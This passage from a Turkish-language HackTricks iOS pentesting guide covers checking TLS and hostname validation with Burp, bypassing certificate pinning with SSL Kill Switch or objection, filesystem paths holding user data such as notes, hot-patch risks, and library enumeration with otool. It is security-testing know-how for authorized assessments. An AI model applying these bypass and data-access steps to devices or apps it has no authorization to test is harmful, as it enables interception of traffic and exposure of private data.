**Şifreleme olmadan** gerçekleşen iletişimin olmadığını ve uygulamanın sunucunun **TLS sertifikasını doğru bir şekilde doğruladığını** kontrol etmek önemlidir.\
Bu tür sorunları kontrol etmek için **Burp** gibi bir proxy kullanabilirsiniz:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Ana bilgisayar adı kontrolü

TLS sertifikasını doğrularken yaygın bir sorun, sertifikasının **güvenilir bir CA tarafından imzalandığını** kontrol etmek, ancak sertifikasının erişilen ana bilgisayar adı olup olmadığını **kontrol etmemektir**.\
Bu sorunu Burp kullanarak kontrol etmek için, iPhone'da Burp CA'ya güven verdikten sonra, **farklı bir ana bilgisayar adı için Burp ile yeni bir sertifika oluşturabilir** ve bunu kullanabilirsiniz. Uygulama hala çalışıyorsa, bir şeyin savunmasız olduğu anlamına gelir.

### Sertifika Pinleme

Bir uygulama SSL Pinning'i doğru bir şekilde kullanıyorsa, uygulama yalnızca beklenen sertifika olduğunda çalışır. Bir uygulamayı test ederken, Burp kendi sertifikasını sunacağından bu bir sorun olabilir.\
Bu korumayı bir jailbroken cihazda atlamak için, [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) uygulamasını veya [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device) uygulamasını yükleyebilirsiniz.

Ayrıca **objection**'ın `ios sslpinning disable` komutunu da kullanabilirsiniz.

## Çeşitli

* **`/System/Library`** dizininde, sistem uygulamaları tarafından kullanılan telefona yüklenen çerçeveleri bulabilirsiniz.
* Kullanıcının App Store'dan yüklediği uygulamalar **`/User/Applications`** dizininde bulunur.
* Ve **`/User/Library`** kullanıcı düzeyindeki uygulamalar tarafından kaydedilen verileri içerir.
* Uygulama içinde kaydedilen notları okumak için **`/User/Library/Notes/notes.sqlite`**'e erişebilirsiniz.
* Yüklenen bir uygulamanın klasörü içinde (**`/User/Applications/<APP ID>/`**) bazı ilginç dosyalar bulabilirsiniz:
* **`iTunesArtwork`**: Uygulama tarafından kullanılan simge
* **`iTunesMetadata.plist`**: App Store'da kullanılan uygulama bilgileri
* **`/Library/*`**: Tercihleri ve önbelleği içerir. **`/Library/Cache/Snapshots/*`** içinde, uygulamanın arka planda gönderilmeden önce yapılan anlık görüntüsünü bulabilirsiniz.

### Sıcak Yama / Zorunlu Güncelleme

Geliştiriciler, uygulamalarının tüm kurulumlarını yeniden göndermek ve onaylanmasını beklemek zorunda kalmadan anında **tüm kurulumlarını uzaktan düzeltebilirler**.\
Bu amaçla genellikle [**JSPatch**](https://github.com/bang590/JSPatch) kullanılır. Ancak [Siren](https://github.com/ArtSabintsev/Siren) ve [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker) gibi diğer seçenekler de vardır.\
**Bu, kötü niyetli üçüncü taraf SDK'ları tarafından kötüye kullanılabilecek tehlikeli bir mekanizmadır, bu nedenle otomatik güncelleme için hangi yöntemin kullanıldığını kontrol etmeniz ve test etmeniz önerilir.** Bu amaçla uygulamanın önceki bir sürümünü indirmeyi deneyebilirsiniz.

### Üçüncü Taraf Hizmetleri

**3. taraf SDK'ları** ile ilgili önemli bir zorluk, bu SDK'ların işlevlerinin **ayrıntılı kontrolünün eksikliği**dir. Geliştiriciler bir seçimle karşı karşıyadır: SDK'yı entegre etmek ve potansiyel güvenlik açıkları ve gizlilik endişeleri de dahil olmak üzere tüm özelliklerini kabul etmek veya tamamen faydalarından vazgeçmek. Bu SDK'lar içindeki güvenlik açıklarını kendileri yamalayamazlar. Dahası, SDK'lar toplulukta güven kazandıkça, bazıları kötü amaçlı yazılım içerebilir.

Üçüncü taraf SDK'ların sağladığı hizmetler, kullanıcı davranış izleme, reklam gösterimi veya kullanıcı deneyimi iyileştirmeleri gibi olabilir. Ancak bu, geliştiricilerin bu kütüphaneler tarafından yürütülen kodun tam olarak farkında olmamasına ve potansiyel gizlilik ve güvenlik risklerine yol açabilecek potansiyel risklere neden olur. Üçüncü taraf hizmetlerle paylaşılan bilgilerin, Kişisel Tanımlanabilir Bilgilerin (PII) ifşa edilmesini önlemek için **anonimleştirilmesi** önemlidir.

Bir uygulamanın kullandığı kütüphaneleri belirlemek için **`otool`** komutu kullanılabilir. Bu araç, uygulama ve kullandığı her paylaşılan kütüphane üzerinde çalıştırılmalı ve ek kütüphaneler keşfedilmelidir.
```bash
otool -L <application_path>
```
## **Referanslar ve Daha Fazla Kaynak**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS ve Mobil Uygulama Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS ücretsiz kurs([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C sürümü [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift sürümü
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin!</summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.

</details>
